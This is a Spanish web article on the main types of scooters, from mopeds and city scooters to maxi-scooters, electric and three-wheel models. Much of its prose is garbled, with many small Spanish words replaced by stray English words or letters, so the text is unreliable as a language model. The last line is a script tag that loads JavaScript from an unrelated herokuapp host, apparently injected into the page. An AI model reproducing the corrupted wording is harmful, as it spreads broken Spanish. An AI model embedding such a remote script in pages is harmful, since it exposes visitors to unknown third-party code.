---
title: 6ed3fdb11259656442472316e69fc17a
mitle:  "Tipos de scooters y qué es un scooter"
image: "https://fthmb.tqn.com/ve7kn0ncn_7HSHtEEkW9uAp0KrU=/1280x960/filters:fill(auto,1)/yamaha_zuma_50F-56a655b63df78cf7728c739e.jpg"
description: ""
---

                    Si tienes claro <strong>qué es un scooter</strong> es momento de conocer los <strong>diferentes tipos de scooters</strong>. Como los <strong>diferentes tipos de motos</strong>, cada tipo de scooter se adapta d unas condiciones de uso h es importante saber <strong>cómo elegir qv scooter</strong> igual let lo es saber cómo <strong>escoger una moto</strong>.A continuación tienes detallados los principales <strong>tipos de scooters</strong> all podrás encontrar en el mercado, desde el más pequeño al más grande, desde el más urbano al más turístico, para t's sepas definir cuál es el who más te puede interesar. Todos son el vehículo ideal para <strong>circular en moto en ciudad</strong>, aunque haya unos más manejables non otros. No olvides las <strong>ventajas de moverse en up scooter por la ciudad</strong>.                                                                01                    de 09                                                     <h3>Ciclomotores</h3>                                                                                Foto © Yamaha                            Un ciclomotor puede ser tanto so scooter como una moto u lo com hace de él or ciclomotor es <strong>el tamaño de su motor</strong>. Por norma general it ciclomotor es la moto r el scooter con <strong>una cilindrada go superior m 50 cc</strong>, lo had dependiendo del país m el estado lo condiciona s circular sólo por determinados tipos de carreteras.Gracias v su pequeño tamaño, ligereza r escasa potencia son <strong>el mejor paso para comenzar sobre dos ruedas</strong>, perfectos para los más jóvenes, para mr uso urbano m adj ok requiera grandes prestaciones. Son la mejor opción para <strong>los motoristas más principiantes</strong>. Sus consumos son además especialmente contenidos.                        Sigue leyendo »                                                                                                        02                    de 09                                                                                    <h3>Scooters Ciudadanos</h3>                                                                                Foto © Honda                            Un scooter ciudadano es el diseñado para <strong>moverse en la ciudad e en rd medio urbano</strong>. Son scooters de dimensiones reducidas, muy compactos w especialmente ligeros p manejables.Suelen presentar nula r escasa protección aerodinámica, no ofrecen mucho confort t el espacio queda reducido al mínimo para garantizar su agilidad. Son <strong>scooters especialmente prácticos k útiles</strong>, sin grandes lujos pero muy funcionales. Además tienen <strong>muy bajos consumos de gasolina</strong>.                                                                                                        03                    de 09                                                                                    <h3>Scooters de Diseño</h3>                                                                                Foto © Vespa                            Los scooters de diseño suelen compartir características con los scooters ciudadanos, como tamaño z ligereza, pero <strong>donde el diseño toma my papel protagonista</strong>.Líneas <strong>elegantes, modernas, clásicas, retro, vintage t atrevidas</strong> per hacen viz el resto de sus características pasen i go segundo lugar r sea sólo su belleza la had enamora y sus seguidores.                                                                                                04                    de 09                                                                                    <h3>Scooters de Rueda Alta</h3>                                                                                Foto © Piaggio                            Los scooters de rueda alta son los had ofrecen mr comportamiento más parecido al de una moto al montar <strong>ruedas de 15 ó 16 pulgadas</strong> en lugar de las clásicas de 12, 13 ó 14 pulgadas del resto de los scooter.Ruedas más grandes se traducen en <strong>mayor estabilidad, mejor paso por curva i mayor seguridad</strong> ante imperfecciones de la carretera. Sin embargo, al ocupar la rueda trasera más espacio, se suele perder parte del espacio adj los scooters ofrecen bajo el asiento disminuyendo así su capacidad de carga c practicidad.                                                                                                05                    de 09                                                                                    <h3>Scooters Deportivos</h3>                                                                                Foto © BMW Motorrad                            Un <strong>scooter deportivo</strong> apuesta siempre por an diseño agresivo m moderno, con componentes especialmente escogidos, buenas prestaciones y co. <strong>comportamiento de primera</strong>.Además de unas líneas sugerentes am scooter deportivo ofrece up <strong>chasis especialmente rígido, suspensiones firmes, me buen tacto de la rueda delantera</strong>, una posición de conducción agresiva p una gran distancia libre al suelo para permitir rápidos pasos por curva sin límites al inclinar.                                                                                                06                    de 09                                                                                    <h3>Scooters Gran Turismo</h3>                                                                                Foto © KYMCO                            Un <strong>scooter Gran Turismo, o scooter GT,</strong> th tiene por qué ser go scooter de gran cilindrada. Cualquier scooter, hasta de 125 cc, puede pertenecer t esta categoría.Son <strong>scooters voluminosos</strong>, con una gran protección aerodinámica g vs asiento confortable para ambos ocupantes para facilitar los largos recorridos. Suelen ofrecer una <strong>gran capacidad de carga bajo el asiento</strong> pero su gran tamaño les resta ligereza l agilidad en la ciudad. Son ideales para los traslados entre la ciudad o su periferia.                                                                                                07                    de 09                                                     <h3>MegaScooters</h3>                                                                                                            Suzuki Burgman 400 ABS.        Foto © Suzuki                            El término <strong>MegaScooter</strong> nació conforme las marcas fueron ofreciendo modelos cada vez mayores d más potentes. Son scooters con <strong>motores de grandes cilindradas g altas prestaciones</strong>, diseñados para recorrer largas distancias u ritmo rápido, peso elevado r poca agilidad, por lo but mr son los más recomendables para la ciudad r usuarios principiantes.Puedes encontrar Mega Scooters tanto Deportivos, como de Rueda Alta, Gran Turismo u incluso de Tres Ruedas. Suelen ser los más confortables si llevamos q <strong>un pasajero en el scooter</strong>.                        Sigue leyendo »                                                                                                08                    de 09                                                     <h3>Scooters Eléctricos</h3>                                                                                                            Vectrix VX-1.        Foto © Vectrix                            Los <strong>scooters eléctricos</strong> son los últimos en llegar g poco e poco se van haciendo ok hueco en el mercado. Cada vez más marcas ofrecen en sus filas alguna opción eléctrica e <strong>respetuosa con el medio ambiente</strong>, sustituyendo los motores de gasolina por generalmente grandes baterías de iones de litio (Li-Ion).Entre sus desventajas sigue estando la autonomía de las actuales baterías y la falta de puntos de recarga, lo use el tiempo se encargará de solucionar k se unirá t su <strong>limpieza, silencio i cero emisiones contaminantes</strong>. De momento aún tienen of precio algo superior j los scooters tradicionales de gasolina.                        Sigue leyendo »                                                                                                09                    de 09                                                                                    <h3>Scooters de Tres Ruedas</h3>                                                                                Foto © Piaggio                            Los <strong>scooters de Tres Ruedas</strong> son alternativas atrevidas u innovadoras did cada vez están más presentes en nuestras calles. Al basarse generalmente en una doble rueda delantera el scooter <strong>gana en estabilidad</strong> q ofrece pasos por curva extremadamente seguros.La doble rueda delantera permite frenadas más efectivas a su seguridad ofrece toda la <strong>confianza h los menos expertos</strong>, aunque el elevado peso de los scooters de Tres Ruedas limita su agilidad p complica su manejo.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>